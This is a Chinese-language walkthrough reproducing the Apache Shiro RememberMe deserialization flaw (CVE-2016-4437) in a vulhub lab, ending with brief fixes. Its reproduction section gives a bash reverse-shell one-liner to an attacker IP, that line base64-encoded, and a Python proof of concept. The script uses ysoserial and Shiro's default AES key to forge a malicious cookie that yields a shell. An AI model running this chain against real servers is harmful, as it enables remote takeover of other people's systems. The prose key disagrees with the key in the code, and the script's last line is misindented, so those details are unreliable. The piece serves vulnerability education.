## 1、Apache Shiro简介

它是一个强大易用的Java安全框架，执行身份验证，授权，密码和会话管理。

## 2、漏洞原理

Shiro提供了记住我(RememberMe)的功能，比如访问淘宝等网站时，关闭了浏览器下次再打开时还是能够记住上次访问过的用户，下次访问时无需再登录即可访问

Shiro会对cookie中的Remember me字段进行相关处理： **序列化-- >AES加密-->base64编码**

由于Shiro本身含有一个预设的AES密钥Base64.decode("KPHblxk5D2deZilxcaaaA==")，每个人都能够通过源代码拿到该密钥，因此攻击者可以构造一个恶意的对象，对其进行序列化并用该密钥进行加密，base64编码，最后作为cookie中的Remember
me字段发送。Shiro得到该Remember me字段后进行解码解密并且反序列化，进而导致任意 **命令执行**

## 3、影响版本

Apache Shiro <= 1.2.4

## 4、漏洞复现

实验靶机：ubuntu 20.0.4

攻击靶机：kali linux

进入/vulhub/shiro/CVE-2016-4437启动靶场环境 docker-compose up -d

打开kali中的浏览器访问，并勾选Remember me登陆  
![图片.png](https://image.3001.net/images/20210812/1628771150_6115134e55a26250adca0.png!small)

对shell反弹命令进行编码：bash -i >& /dev/tcp/192.168.146.129/1234 0>&1  
编码后：`bash -c
{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE0Ni4xMjkvMTIzNCAwPiYxCgoKCgoKCg==}|{base64,-d}|{bash,-i}`

启用ysoserial(针对Java反序列化的Java工具)的监听模块，并选择一个监听端口  
![图片.png](https://image.3001.net/images/20210812/1628771272_611513c8e8b58801e140f.png!small)

使用python编写的poc生成恶意cookie

    
    
    import sys
    import uuid
    import base64
    import subprocess
    from Crypto.Cipher import AES
    
    def encode_rememberme(command):
    
        popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', 'JRMPClient', command], stdout=subprocess.PIPE)
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
        iv = uuid.uuid4().bytes
        encryptor = AES.new(key, AES.MODE_CBC, iv)
        file_body = pad(popen.stdout.read())
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
        return base64_ciphertext
    
    
    if __name__ == '__main__':
        payload = encode_rememberme(sys.argv[1])
    print "rememberMe={0}".format(payload.decode())
    

执行命令生成cookie  
**注意点：**此处端口号需要与前面ysoserial监听模块端口一致

![图片.png](https://image.3001.net/images/20210812/1628771329_61151401897b7e3031911.png!small)

在使用cookie前需要先开启客户端的监听，否则可能得不到反弹的shell

![图片.png](https://image.3001.net/images/20210812/1628771352_611514181ebca6117f5d7.png!small)

打开浏览器，使用burpSuite抓包，使用恶意cookie代替原先的cookie发送

![图片.png](https://image.3001.net/images/20210812/1628771383_61151437bcc6a28f09cca.png!small)

查看nc成功连接到了反弹的shell，并可以执行命令

![图片.png](https://image.3001.net/images/20210812/1628771400_611514484a309de3322a0.png!small)

## 5、漏洞修复

删除代码中的默认密钥

升级Shiro到1.2.5及以上

不要使用网上的密钥，可以自己base64生成一个AES密钥

